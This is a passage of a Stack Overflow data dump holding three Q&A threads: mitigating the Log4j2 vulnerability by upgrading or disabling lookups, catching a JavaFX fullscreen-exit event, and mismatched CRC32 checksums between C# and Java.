mitigate the exploit if upgrading is (currently) not an option:\r\n\r\n&gt; Mitigation: In releases &gt;=2.10, this behavior can be mitigated by setting either the system property `log4j2.formatMsgNoLookups` or the environment variable `LOG4J_FORMAT_MSG_NO_LOOKUPS` to `true`. For releases from 2.0-beta9 to 2.10.0, the mitigation is to remove the `JndiLookup` class from the classpath: `zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class`.\r\n\r\nIf we are using `spring-boot-starter-logging` with no additional configuration, we are not affected. For details, see the [spring-boot infromation on the issue (`spring.io`)][springLog4J].\r\n\r\nSimilarly, we are not affected when we are using quarkus, as long as we do not add the `log4j` dependency explicitly. See [the corresponding github issue (`github.com`)][quarkusGithubIssueLog4J]\r\n\r\n[mavenLog4J]: https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.15.0\r\n\r\n[log4J2.15patchnotes]: https://logging.apache.org/log4j/2.x/security.html\r\n\r\n[springLog4J]: https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\r\n\r\n[quarkusGithubIssueLog4j]: https://github.com/quarkusio/quarkus/discussions/22108","title":"How to patch Log4j2 0-day exploit","body":"<p>We should upgrade log4j to version <code>2.17.0</code> (available at <a href=\"https://mvnrepository.com/artifact/org.apache.logging.log4j/log4j-core/2.15.0\" rel=\"nofollow noreferrer\"><code>mvnrepository.com</code></a>). <a href=\"https://logging.apache.org/log4j/2.x/security.html\" rel=\"nofollow noreferrer\">As per the security notes (<code>logging.apache.org</code>)</a>, the vulnerability is fixed in <code>2.15.0</code>. There are, however, two other vulnerabilities in <code>2.15.0</code>, which were patched in <code>2.16.0</code> and <code>2.17.0</code> respectively.</p>\n<p>The security notes also list actions to mitigate the exploit if upgrading is (currently) not an option:</p>\n<blockquote>\n<p>Mitigation: In releases &gt;=2.10, this behavior can be mitigated by setting either the system property <code>log4j2.formatMsgNoLookups</code> or the environment variable <code>LOG4J_FORMAT_MSG_NO_LOOKUPS</code> to <code>true</code>. For releases from 2.0-beta9 to 2.10.0, the mitigation is to remove the <code>JndiLookup</code> class from the classpath: <code>zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</code>.</p>\n</blockquote>\n<p>If we are using <code>spring-boot-starter-logging</code> with no additional configuration, we are not affected. For details, see the <a href=\"https://spring.io/blog/2021/12/10/log4j2-vulnerability-and-spring-boot\" rel=\"nofollow noreferrer\">spring-boot infromation on the issue (<code>spring.io</code>)</a>.</p>\n<p>Similarly, we are not affected when we are using quarkus, as long as we do not add the <code>log4j</code> dependency explicitly. See <a href=\"https://github.com/quarkusio/quarkus/discussions/22108\" rel=\"nofollow noreferrer\">the corresponding github issue (<code>github.com</code>)</a></p>\n"}],"owner":{"account_id":19165831,"reputation":639,"user_id":14000568,"display_name":"deirdreamuel"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":796,"favorite_count":0,"down_vote_count":4,"up_vote_count":3,"accepted_answer_id":70317974,"answer_count":1,"score":-1,"last_activity_date":1640266958,"creation_date":1639247158,"question_id":70317913,"body_markdown":"We are using Java for one of our services which uses log4j2 library. As of December 10, 2021, an exploit was found to execute remote code for Java using log4j2. I am wondering what is the best way to address this? Is it suitable to just use another Java logging library instead? Or is there a configuration for log4j2 so that we wont have to go through all that trouble changing the logging library?","title":"How to patch Log4j2 0-day exploit","body":"<p>We are using Java for one of our services which uses log4j2 library. As of December 10, 2021, an exploit was found to execute remote code for Java using log4j2. I am wondering what is the best way to address this? Is it suitable to just use another Java logging library instead? Or is there a configuration for log4j2 so that we wont have to go through all that trouble changing the logging library?</p>\n"},{"tags":["java","javafx"],"comments":[{"owner":{"account_id":70123,"reputation":51175,"user_id":203657,"accept_rate":53,"display_name":"kleopatra"},"score":0,"creation_date":1640267877,"post_id":70461895,"comment_id":124557514,"body_markdown":"how about reading the api doc of stage/window as a first step ;) If applying what you learned from isn&#39;t working as you expect it, next step is to provide a [mcve] demonstrating the problem. BTW: you loading snippet looks fishy - assuming that MainController is-a class that&#39;s loaded with its fields/handlers injected via fxml. If that assumption is wrong, you might consider naming it to someting other than xxController to not confuse the readers :)","body":"how about reading the api doc of stage/window as a first step ;) If applying what you learned from isn&#39;t working as you expect it, next step is to provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> demonstrating the problem. BTW: you loading snippet looks fishy - assuming that MainController is-a class that&#39;s loaded with its fields/handlers injected via fxml. If that assumption is wrong, you might consider naming it to someting other than xxController to not confuse the readers :)"},{"owner":{"account_id":5992289,"reputation":483,"user_id":4708062,"accept_rate":100,"display_name":"Marco"},"score":0,"creation_date":1640272940,"post_id":70461895,"comment_id":124559358,"body_markdown":"@kleopatra - thanks for your feedback - i&#39;m in the early stages with Java &amp; my JavaFX skills are only a few weeks old. For sure you&#39;re right RTMF but i was not able to find a solution by the given information from school / docs. c0der was gently enough to show me that there is a way to detect changes by adding a listener to stageProps which is nice becaus i did not realized that before. And yes the Controller got its fields injected by fxml - yes the FXML tag was missing in this stage of dev but was added some minutes ago ;-) - Thanks for your feedback!","body":"@kleopatra - thanks for your feedback - i&#39;m in the early stages with Java &amp; my JavaFX skills are only a few weeks old. For sure you&#39;re right RTMF but i was not able to find a solution by the given information from school / docs. c0der was gently enough to show me that there is a way to detect changes by adding a listener to stageProps which is nice becaus i did not realized that before. And yes the Controller got its fields injected by fxml - yes the FXML tag was missing in this stage of dev but was added some minutes ago ;-) - Thanks for your feedback!"},{"owner":{"account_id":8532578,"reputation":39898,"user_id":6395627,"display_name":"Slaw"},"score":2,"creation_date":1640286711,"post_id":70461895,"comment_id":124563592,"body_markdown":"About `MainController`: You&#39;re creating your own instance and then calling a method on it. That should not work as you expect. If you&#39;re using `fx:controller` in the FXML file then the `FXMLLoader` will instantiate `MainController` for you, via reflection. Thus, the instance of `MainController` that you created is not the same instance which had its fields injected and such. If you want access to the controller instance created by the `FXMLLoader`, then create an **instance** of `FXMLLoader` and use the **instance** `load` method, followed by the `getController()` method.","body":"About <code>MainController</code>: You&#39;re creating your own instance and then calling a method on it. That should not work as you expect. If you&#39;re using <code>fx:controller</code> in the FXML file then the <code>FXMLLoader</code> will instantiate <code>MainController</code> for you, via reflection. Thus, the instance of <code>MainController</code> that you created is not the same instance which had its fields injected and such. If you want access to the controller instance created by the <code>FXMLLoader</code>, then create an <b>instance</b> of <code>FXMLLoader</code> and use the <b>instance</b> <code>load</code> method, followed by the <code>getController()</code> method."},{"owner":{"account_id":5992289,"reputation":483,"user_id":4708062,"accept_rate":100,"display_name":"Marco"},"score":0,"creation_date":1640339925,"post_id":70461895,"comment_id":124572660,"body_markdown":"oh! Thanks @Slaw i missed that completely - it still works in this stage of dev but you&#39;re totally right i will get into problems. I have to rework this part.","body":"oh! Thanks @Slaw i missed that completely - it still works in this stage of dev but you&#39;re totally right i will get into problems. I have to rework this part."}],"answers":[{"tags":[],"owner":{"account_id":4962253,"reputation":18492,"user_id":3992939,"accept_rate":73,"display_name":"c0der"},"down_vote_count":0,"up_vote_count":2,"is_accepted":true,"score":2,"last_activity_date":1640266877,"creation_date":1640266877,"answer_id":70462936,"question_id":70461895,"body_markdown":"Listen to `stage.fullScreenProperty()` and respond to changes: \r\n\r\n    stage.fullScreenProperty().addListener((ChangeListener) (obs,oldValue,newValue) -&gt; \r\n                                              {/*TODO respond to changes in full screen */;});","title":"JavaFX Java17 - exit Fullscreen Event","body":"<p>Listen to <code>stage.fullScreenProperty()</code> and respond to changes:</p>\n<pre><code>stage.fullScreenProperty().addListener((ChangeListener) (obs,oldValue,newValue) -&gt; \n                                          {/*TODO respond to changes in full screen */;});\n</code></pre>\n"}],"owner":{"account_id":5992289,"reputation":483,"user_id":4708062,"accept_rate":100,"display_name":"Marco"},"comment_count":4,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":226,"favorite_count":0,"down_vote_count":1,"up_vote_count":1,"accepted_answer_id":70462936,"answer_count":1,"score":0,"last_activity_date":1640266877,"creation_date":1640260938,"question_id":70461895,"body_markdown":"I have added a custom toolbar (where my window actions are placed) to my application. So far everything works well. Related to the window handling I&#39;m searching for a possibility to handle the &quot;fullscreen got closed&quot; event. Scenario:\r\nApp starts in windowed mode -&gt; user clicks on (custom) toolbar button to get into fullscreen. The Toolbar will now be set its visibility to false. The users now exits fullscreen mode via button (native macOS Button to exit fullscreen) --&gt; I need now to react for this (to set the toolbar to visible again) but cannot find a way how to do it.\r\n\r\nmain.java\r\n\r\n    MainController mc = new MainController();\r\n    Parent root = FXMLLoader.load(getClass().getResource(&quot;welcome-view.fxml&quot;));\r\n    stage.initStyle(StageStyle.TRANSPARENT);\r\n    mc.doSwitchScenes(stage, root);\r\n    stage.show();\r\n\r\nMainController.java\r\n\r\n    ...\r\n    private String title = &quot;Project Apollo&quot;;\r\n    private Color fillColor = TRANSPARENT;\r\n    private int minWidth = 800;\r\n    private int minHeight = 600;\r\n    ...\r\n    \r\n    public void btnMinimize(MouseEvent mouseEvent) {\r\n        Stage stage = (Stage)((Circle)mouseEvent.getSource()).getScene().getWindow();\r\n        // is stage minimizable into task bar. (true | false)\r\n        stage.setIconified(true);\r\n    };\r\n\r\n    public void btnCloseApp(MouseEvent mouseEvent) {\r\n        Platform.exit();\r\n        System.exit(0);\r\n    }\r\n\r\n    public void btnFullscreen(MouseEvent mouseEvent) {\r\n        Stage stage = (Stage)((Circle)mouseEvent.getSource()).getScene().getWindow();\r\n        stage.setFullScreen(true);\r\n        Scene actualScene = ((Node)mouseEvent.getSource()).getScene();\r\n        Parent hbc = (Parent) actualScene.lookup(&quot;#headerBarContainer&quot;);\r\n\r\n        if(hbc != null){\r\n            hbc.setVisible(false);\r\n        }\r\n        System.out.println(&quot;clicked FS&quot;);\r\n\r\n    }\r\n    ...\r\n\r\nThe point is that at least on MacOS the window has its native os control to exit fullscreen - is it possible to target this event or at least the change of the stage size maybe?","title":"JavaFX Java17 - exit Fullscreen Event","body":"<p>I have added a custom toolbar (where my window actions are placed) to my application. So far everything works well. Related to the window handling I'm searching for a possibility to handle the &quot;fullscreen got closed&quot; event. Scenario:\nApp starts in windowed mode -&gt; user clicks on (custom) toolbar button to get into fullscreen. The Toolbar will now be set its visibility to false. The users now exits fullscreen mode via button (native macOS Button to exit fullscreen) --&gt; I need now to react for this (to set the toolbar to visible again) but cannot find a way how to do it.</p>\n<p>main.java</p>\n<pre><code>MainController mc = new MainController();\nParent root = FXMLLoader.load(getClass().getResource(&quot;welcome-view.fxml&quot;));\nstage.initStyle(StageStyle.TRANSPARENT);\nmc.doSwitchScenes(stage, root);\nstage.show();\n</code></pre>\n<p>MainController.java</p>\n<pre><code>...\nprivate String title = &quot;Project Apollo&quot;;\nprivate Color fillColor = TRANSPARENT;\nprivate int minWidth = 800;\nprivate int minHeight = 600;\n...\n\npublic void btnMinimize(MouseEvent mouseEvent) {\n    Stage stage = (Stage)((Circle)mouseEvent.getSource()).getScene().getWindow();\n    // is stage minimizable into task bar. (true | false)\n    stage.setIconified(true);\n};\n\npublic void btnCloseApp(MouseEvent mouseEvent) {\n    Platform.exit();\n    System.exit(0);\n}\n\npublic void btnFullscreen(MouseEvent mouseEvent) {\n    Stage stage = (Stage)((Circle)mouseEvent.getSource()).getScene().getWindow();\n    stage.setFullScreen(true);\n    Scene actualScene = ((Node)mouseEvent.getSource()).getScene();\n    Parent hbc = (Parent) actualScene.lookup(&quot;#headerBarContainer&quot;);\n\n    if(hbc != null){\n        hbc.setVisible(false);\n    }\n    System.out.println(&quot;clicked FS&quot;);\n\n}\n...\n</code></pre>\n<p>The point is that at least on MacOS the window has its native os control to exit fullscreen - is it possible to target this event or at least the change of the stage size maybe?</p>\n"},{"tags":["c#","java","crc32"],"comments":[{"owner":{"account_id":235632,"reputation":9499,"user_id":502575,"accept_rate":100,"display_name":"Stefan P."},"score":0,"creation_date":1351416288,"post_id":13107665,"comment_id":17817558,"body_markdown":"Have you look at this http://stackoverflow.com/questions/4344190/java-crc32-not-the-same-as-crc-from-c-sharp","body":"Have you look at this <a href=\"http://stackoverflow.com/questions/4344190/java-crc32-not-the-same-as-crc-from-c-sharp\" title=\"java crc32 not the same as crc from c sharp\">stackoverflow.com/questions/4344190/&hellip;</a>"},{"owner":{"account_id":358449,"reputation":42107,"user_id":699224,"accept_rate":67,"display_name":"DNA"},"score":3,"creation_date":1351416300,"post_id":13107665,"comment_id":17817560,"body_markdown":"Difficult to say without seeing your code. Maybe you are ending up with Strings with different underlying binary representations or character encodings, so they look the same but checksum differently.","body":"Difficult to say without seeing your code. Maybe you are ending up with Strings with different underlying binary representations or character encodings, so they look the same but checksum differently."},{"owner":{"account_id":94736,"reputation":48421,"user_id":258483,"accept_rate":46,"display_name":"Dims"},"score":1,"creation_date":1351416717,"post_id":13107665,"comment_id":17817619,"body_markdown":"How do you compute? With witch library or self-made functions? Algorithm matters!","body":"How do you compute? With witch library or self-made functions? Algorithm matters!"},{"owner":{"account_id":199923,"reputation":106976,"user_id":445517,"accept_rate":43,"display_name":"CodesInChaos"},"score":3,"creation_date":1351416938,"post_id":13107665,"comment_id":17817656,"body_markdown":"CRC is calculated over a sequence of bytes and not over a string. If you use a different encoding to transform a string to a sequence of bytes the result will be different. So please post your encoding related code.","body":"CRC is calculated over a sequence of bytes and not over a string. If you use a different encoding to transform a string to a sequence of bytes the result will be different. So please post your encoding related code."},{"owner":{"account_id":1985062,"reputation":920,"user_id":1780538,"accept_rate":60,"display_name":"user1780538"},"score":0,"creation_date":1351417041,"post_id":13107665,"comment_id":17817665,"body_markdown":"@StefanP. Yeah, I have looked this code. But didn&#39;t get my answer.","body":"@StefanP. Yeah, I have looked this code. But didn&#39;t get my answer."},{"owner":{"account_id":1985062,"reputation":920,"user_id":1780538,"accept_rate":60,"display_name":"user1780538"},"score":0,"creation_date":1351417091,"post_id":13107665,"comment_id":17817670,"body_markdown":"@Dims I have inherited HashAlgorithm class of C#","body":"@Dims I have inherited HashAlgorithm class of C#"},{"owner":{"account_id":1985062,"reputation":920,"user_id":1780538,"accept_rate":60,"display_name":"user1780538"},"score":0,"creation_date":1351417171,"post_id":13107665,"comment_id":17817682,"body_markdown":"@CodesInChaos I used ASCII encoding to generate bytes-\n\nCrc32 crc32 = new Crc32();\n\t\t\tcrc32.ComputeHash(Encoding.ASCII.GetBytes(msgText));","body":"@CodesInChaos I used ASCII encoding to generate bytes-  Crc32 crc32 = new Crc32(); \t\t\tcrc32.ComputeHash(Encoding.ASCII.GetBytes(msgText));"},{"owner":{"account_id":199923,"reputation":106976,"user_id":445517,"accept_rate":43,"display_name":"CodesInChaos"},"score":1,"creation_date":1351417260,"post_id":13107665,"comment_id":17817697,"body_markdown":"Post sufficient code to answer the question.","body":"Post sufficient code to answer the question."},{"owner":{"account_id":199923,"reputation":106976,"user_id":445517,"accept_rate":43,"display_name":"CodesInChaos"},"score":1,"creation_date":1351417601,"post_id":13107665,"comment_id":17817742,"body_markdown":"I believe the bug in in the Java code, not the C# code.","body":"I believe the bug in in the Java code, not the C# code."},{"owner":{"account_id":71739,"reputation":307142,"user_id":207421,"accept_rate":82,"display_name":"user207421"},"score":1,"creation_date":1351459255,"post_id":13107665,"comment_id":17827430,"body_markdown":"It depends first of all on whether both languages are using the same CRC polynomial and initial value. Have you investigated that?  The Java CRC32 calculation is documented. What parameters is your home-grown C# code using?","body":"It depends first of all on whether both languages are using the same CRC polynomial and initial value. Have you investigated that?  The Java CRC32 calculation is documented. What parameters is your home-grown C# code using?"}],"answers":[{"tags":[],"owner":{"account_id":1114067,"reputation":196781,"user_id":1103872,"accept_rate":82,"display_name":"Marko Topolnik"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1351416740,"creation_date":1351416740,"answer_id":13107713,"question_id":13107665,"body_markdown":"Without delving into any detail, the problem can be related to Java&#39;s lack of unsigned integer types. The problem could happen at the `int` level, but also at the `byte` level. This is one avenue of investigation.","title":"Is there any difference in calculating CRC32 checksum in C# and Java?","body":"<p>Without delving into any detail, the problem can be related to Java's lack of unsigned integer types. The problem could happen at the <code>int</code> level, but also at the <code>byte</code> level. This is one avenue of investigation.</p>\n"},{"tags":[],"owner":{"account_id":199923,"reputation":106976,"user_id":445517,"accept_rate":43,"display_name":"CodesInChaos"},"down_vote_count":0,"up_vote_count":4,"is_accepted":false,"score":4,"last_activity_date":1351417157,"creation_date":1351417157,"answer_id":13107751,"question_id":13107665,"body_markdown":"CRC32 is calculated over a sequence of bytes and not over a string. So to calculate CRC32 you need to transform the string into bytes first. If you use a different encoding to transform a string to a sequence of bytes the result will be different.\r\n\r\nThus you need to use the same encoding on both sides. I recommend using UTF-8 without BOM.","title":"Is there any difference in calculating CRC32 checksum in C# and Java?","body":"<p>CRC32 is calculated over a sequence of bytes and not over a string. So to calculate CRC32 you need to transform the string into bytes first. If you use a different encoding to transform a string to a sequence of bytes the result will be different.</p>\n\n<p>Thus you need to use the same encoding on both sides. I recommend using UTF-8 without BOM.</p>\n"},{"tags":[],"owner":{"account_id":94736,"reputation":48421,"user_id":258483,"accept_rate":46,"display_name":"Dims"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1351423377,"creation_date":1351423377,"answer_id":13108387,"question_id":13107665,"body_markdown":"I have calculated CRC32 with Java and got the same you got in C#. I.e. `CRC32(43HLV109520DAP10072la19z6)=2947932745 `. This means that either they have a bug in java, or you have a bug during transmission.\r\n\r\nCode follows.\r\n\r\nI suggest you try to send simple data to java application, like zeros or ones, and try to deduce how do they compute CRC.\r\n\r\n    public static void main(String[] args) {\r\n\t\t\r\n\t\tCRC32 crc32 = new CRC32();\r\n\t\t\r\n\t\tString data = &quot;43HLV109520DAP10072la19z6&quot;;\r\n\t\t\r\n\t\tString[] cs = new String[] {&quot;utf8&quot; /*, &quot;cp1252&quot;, &quot;cp866&quot; */};\r\n\t\tbyte[] array;\r\n\t\tbyte b;\r\n\t\t\r\n\t\tfor(int i=0; i&lt;cs.length; ++i) {\r\n\t\t\r\n\t\t\tarray = data.getBytes(Charset.forName(cs[i]));\r\n\t\t\t\r\n\t\t\tcrc32.reset();\r\n\t\t\tcrc32.update(array);\r\n\t\t\t\r\n\t\t\tSystem.out.println(String.format(&quot;%s: %d&quot;, cs[i], crc32.getValue()));\r\n\t\t\t\r\n\t\t\t/*\r\n\t\t\tfor(int j=0; j&lt;array.length/2; j++) {\r\n\t\t\t\tb = array[i];\r\n\t\t\t\tarray[i] = array[array.length-1-i];\r\n\t\t\t\tarray[array.length-1-i] = b;\r\n\t\t\t}\r\n\t\t\t*/\r\n\t\t\t\r\n\t\t\tfor(int j=0; j&lt;array.length; j+=2) {\r\n\t\t\t\tb = array[i];\r\n\t\t\t\tarray[i] = array[i+2];\r\n\t\t\t\tarray[i+1] = b;\r\n\t\t\t}\r\n\t\t\t\r\n\t\t\tcrc32.reset();\r\n\t\t\tcrc32.update(array);\r\n\t\t\t\r\n\t\t\tSystem.out.println(String.format(&quot;of modified: %d&quot;, crc32.getValue()));\r\n\t\t}\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t\t\r\n\t}\r\n\r\n**UPDATE**\r\n\r\nEndiannes reverse also not help\r\n\r\n            for(int j=0; j&lt;array.length; j+=4) {\r\n\t\t\t\t\r\n\t\t\t\tb = array[i];\r\n\t\t\t\tarray[i] = array[i+3];\r\n\t\t\t\tarray[i+3] = b;\r\n\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t\tb = array[i+1];\r\n\t\t\t\tarray[i+1] = array[i+2];\r\n\t\t\t\tarray[i+2] = b;\r\n\t\t\t}","title":"Is there any difference in calculating CRC32 checksum in C# and Java?","body":"<p>I have calculated CRC32 with Java and got the same you got in C#. I.e. <code>CRC32(43HLV109520DAP10072la19z6)=2947932745</code>. This means that either they have a bug in java, or you have a bug during transmission.</p>\n\n<p>Code follows.</p>\n\n<p>I suggest you try to send simple data to java application, like zeros or ones, and try to deduce how do they compute CRC.</p>\n\n<pre><code>public static void main(String[] args) {\n\n    CRC32 crc32 = new CRC32();\n\n    String data = \"43HLV109520DAP10072la19z6\";\n\n    String[] cs = new String[] {\"utf8\" /*, \"cp1252\", \"cp866\" */};\n    byte[] array;\n    byte b;\n\n    for(int i=0; i&lt;cs.length; ++i) {\n\n        array = data.getBytes(Charset.forName(cs[i]));\n\n        crc32.reset();\n        crc32.update(array);\n\n        System.out.println(String.format(\"%s: %d\", cs[i], crc32.getValue()));\n\n        /*\n        for(int j=0; j&lt;array.length/2; j++) {\n            b = array[i];\n            array[i] = array[array.length-1-i];\n            array[array.length-1-i] = b;\n        }\n        */\n\n        for(int j=0; j&lt;array.length; j+=2) {\n            b = array[i];\n            array[i] = array[i+2];\n            array[i+1] = b;\n        }\n\n        crc32.reset();\n        crc32.update(array);\n\n        System.out.println(String.format(\"of modified: %d\", crc32.getValue()));\n    }\n\n\n\n\n}\n</code></pre>\n\n<p><strong>UPDATE</strong></p>\n\n<p>Endiannes reverse also not help</p>\n\n<pre><code>        for(int j=0; j&lt;array.length; j+=4) {\n\n            b = array[i];\n            array[i] = array[i+3];\n            array[i+3] = b;\n\n\n            b = array[i+1];\n            array[i+1] = array[i+2];\n            array[i+2] = b;\n        }\n</code></pre>\n"},{"tags":[],"owner":{"account_id":6156960,"reputation":126,"user_id":4799639,"display_name":"dilipkumar katre"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640266579,"creation_date":1640260444,"answer_id":70461815,"question_id":13107665,"body_markdown":"CRC is calculated over a sequence of bytes and not over a string.\r\nWhichever CRC in java looks different due unavailability of Unsigned int in java.\r\n\r\nConvert calculated Int CRC into Hex String and take last 2 Bytes (length 4)\r\n\r\nThat is your actual CRC unsigned Int.\r\n\r\n    String hexCrc = Integer.toHexString(crcCalculated);\r\n    hexCrc = hexCrc.substring(hexCrc.length()-4);\r\n\r\ncompare hex CRC of c# and Java both should be same.\r\n\r\n","title":"Is there any difference in calculating CRC32 checksum in C# and Java?","body":"<p>CRC is calculated over a sequence of bytes and not over a string.\nWhichever CRC in java looks different due unavailability of Unsigned int in java.</p>\n<p>Convert calculated Int CRC into Hex String and take last 2 Bytes (length 4)</p>\n<p>That is your actual CRC unsigned Int.</p>\n<pre><code>String hexCrc = Integer.toHexString(crcCalculated);\nhexCrc = hexCrc.substring(hexCrc.length()-4);\n</code></pre>\n<p>compare hex CRC of c# and Java both should be same.</p>\n"}],"owner":{"account_id":1985062,"reputation":920,"user_id":1780538,"accept_rate":60,"display_name":"user1780538"},"comment_count":10,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":5267,"favorite_count":0,"down_vote_count":1,"up_vote_count":6,"accepted_answer_id":13108387,"answer_count":4,"score":5,"last_activity_date":1640266579,"creation_date":1351416157,"question_id":13107665,"body_markdown":"I have to calculate CRC32 checksum for a string in C# and send it to an external application.\r\n\r\nOn the other end they will calculate it using Java.\r\n\r\nBut my checksum does not match on the their end.\r\n\r\n\r\ne.g. CRC32 checksum of the following string\r\n43HLV109520DAP10072la19z6\r\n\r\nis 1269993351 on their end.\r\n\r\nAnd 2947932745 at my end using C#\r\n\r\n\r\nPlease tell me what&#39;s going wrong in my code.\r\n\r\nI am using this 0xffffffff default seed and following crc table\r\n\r\n\r\n    readonly static uint[] CRCTable = new uint[] {\r\n                0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419,\r\n                0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4,\r\n                0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07,\r\n                0x90BF1D91, 0x1DB71064, 0x6AB020F2, 0xF3B97148, 0x84BE41DE,\r\n                0x1ADAD47D, 0x6DDDE4EB, 0xF4D4B551, 0x83D385C7, 0x136C9856,\r\n                0x646BA8C0, 0xFD62F97A, 0x8A65C9EC, 0x14015C4F, 0x63066CD9,\r\n                0xFA0F3D63, 0x8D080DF5, 0x3B6E20C8, 0x4C69105E, 0xD56041E4,\r\n                0xA2677172, 0x3C03E4D1, 0x4B04D447, 0xD20D85FD, 0xA50AB56B,\r\n                0x35B5A8FA, 0x42B2986C, 0xDBBBC9D6, 0xACBCF940, 0x32D86CE3,\r\n                0x45DF5C75, 0xDCD60DCF, 0xABD13D59, 0x26D930AC, 0x51DE003A,\r\n                0xC8D75180, 0xBFD06116, 0x21B4F4B5, 0x56B3C423, 0xCFBA9599,\r\n                0xB8BDA50F, 0x2802B89E, 0x5F058808, 0xC60CD9B2, 0xB10BE924,\r\n                0x2F6F7C87, 0x58684C11, 0xC1611DAB, 0xB6662D3D, 0x76DC4190,\r\n                0x01DB7106, 0x98D220BC, 0xEFD5102A, 0x71B18589, 0x06B6B51F,\r\n                0x9FBFE4A5, 0xE8B8D433, 0x7807C9A2, 0x0F00F934, 0x9609A88E,\r\n                0xE10E9818, 0x7F6A0DBB, 0x086D3D2D, 0x91646C97, 0xE6635C01,\r\n                0x6B6B51F4, 0x1C6C6162, 0x856530D8, 0xF262004E, 0x6C0695ED,\r\n                0x1B01A57B, 0x8208F4C1, 0xF50FC457, 0x65B0D9C6, 0x12B7E950,\r\n                0x8BBEB8EA, 0xFCB9887C, 0x62DD1DDF, 0x15DA2D49, 0x8CD37CF3,\r\n                0xFBD44C65, 0x4DB26158, 0x3AB551CE, 0xA3BC0074, 0xD4BB30E2,\r\n                0x4ADFA541, 0x3DD895D7, 0xA4D1C46D, 0xD3D6F4FB, 0x4369E96A,\r\n                0x346ED9FC, 0xAD678846, 0xDA60B8D0, 0x44042D73, 0x33031DE5,\r\n                0xAA0A4C5F, 0xDD0D7CC9, 0x5005713C, 0x270241AA, 0xBE0B1010,\r\n                0xC90C2086, 0x5768B525, 0x206F85B3, 0xB966D409, 0xCE61E49F,\r\n                0x5EDEF90E, 0x29D9C998, 0xB0D09822, 0xC7D7A8B4, 0x59B33D17,\r\n                0x2EB40D81, 0xB7BD5C3B, 0xC0BA6CAD, 0xEDB88320, 0x9ABFB3B6,\r\n                0x03B6E20C, 0x74B1D29A, 0xEAD54739, 0x9DD277AF, 0x04DB2615,\r\n                0x73DC1683, 0xE3630B12, 0x94643B84, 0x0D6D6A3E, 0x7A6A5AA8,\r\n                0xE40ECF0B, 0x9309FF9D, 0x0A00AE27, 0x7D079EB1, 0xF00F9344,\r\n                0x8708A3D2, 0x1E01F268, 0x6906C2FE, 0xF762575D, 0x806567CB,\r\n                0x196C3671, 0x6E6B06E7, 0xFED41B76, 0x89D32BE0, 0x10DA7A5A,\r\n                0x67DD4ACC, 0xF9B9DF6F, 0x8EBEEFF9, 0x17B7BE43, 0x60B08ED5,\r\n                0xD6D6A3E8, 0xA1D1937E, 0x38D8C2C4, 0x4FDFF252, 0xD1BB67F1,\r\n                0xA6BC5767, 0x3FB506DD, 0x48B2364B, 0xD80D2BDA, 0xAF0A1B4C,\r\n                0x36034AF6, 0x41047A60, 0xDF60EFC3, 0xA867DF55, 0x316E8EEF,\r\n                0x4669BE79, 0xCB61B38C, 0xBC66831A, 0x256FD2A0, 0x5268E236,\r\n                0xCC0C7795, 0xBB0B4703, 0x220216B9, 0x5505262F, 0xC5BA3BBE,\r\n                0xB2BD0B28, 0x2BB45A92, 0x5CB36A04, 0xC2D7FFA7, 0xB5D0CF31,\r\n                0x2CD99E8B, 0x5BDEAE1D, 0x9B64C2B0, 0xEC63F226, 0x756AA39C,\r\n                0x026D930A, 0x9C0906A9, 0xEB0E363F, 0x72076785, 0x05005713,\r\n                0x95BF4A82, 0xE2B87A14, 0x7BB12BAE, 0x0CB61B38, 0x92D28E9B,\r\n                0xE5D5BE0D, 0x7CDCEFB7, 0x0BDBDF21, 0x86D3D2D4, 0xF1D4E242,\r\n                0x68DDB3F8, 0x1FDA836E, 0x81BE16CD, 0xF6B9265B, 0x6FB077E1,\r\n                0x18B74777, 0x88085AE6, 0xFF0F6A70, 0x66063BCA, 0x11010B5C,\r\n                0x8F659EFF, 0xF862AE69, 0x616BFFD3, 0x166CCF45, 0xA00AE278,\r\n                0xD70DD2EE, 0x4E048354, 0x3903B3C2, 0xA7672661, 0xD06016F7,\r\n                0x4969474D, 0x3E6E77DB, 0xAED16A4A, 0xD9D65ADC, 0x40DF0B66,\r\n                0x37D83BF0, 0xA9BCAE53, 0xDEBB9EC5, 0x47B2CF7F, 0x30B5FFE9,\r\n                0xBDBDF21C, 0xCABAC28A, 0x53B39330, 0x24B4A3A6, 0xBAD03605,\r\n                0xCDD70693, 0x54DE5729, 0x23D967BF, 0xB3667A2E, 0xC4614AB8,\r\n                0x5D681B02, 0x2A6F2B94, 0xB40BBE37, 0xC30C8EA1, 0x5A05DF1B,\r\n                0x2D02EF8D\r\n            };\r\n\r\n","title":"Is there any difference in calculating CRC32 checksum in C# and Java?","body":"<p>I have to calculate CRC32 checksum for a string in C# and send it to an external application.</p>\n\n<p>On the other end they will calculate it using Java.</p>\n\n<p>But my checksum does not match on the their end.</p>\n\n<p>e.g. CRC32 checksum of the following string\n43HLV109520DAP10072la19z6</p>\n\n<p>is 1269993351 on their end.</p>\n\n<p>And 2947932745 at my end using C#</p>\n\n<p>Please tell me what's going wrong in my code.</p>\n\n<p>I am using this 0xffffffff default seed and following crc table</p>\n\n<pre><code>readonly static uint[] CRCTable = new uint[] {\n            0x00000000, 0x77073096, 0xEE0E612C, 0x990951BA, 0x076DC419,\n            0x706AF48F, 0xE963A535, 0x9E6495A3, 0x0EDB8832, 0x79DCB8A4,\n            0xE0D5E91E, 0x97D2D988, 0x09B64C2B, 0x7EB17CBD, 0xE7B82D07,\n       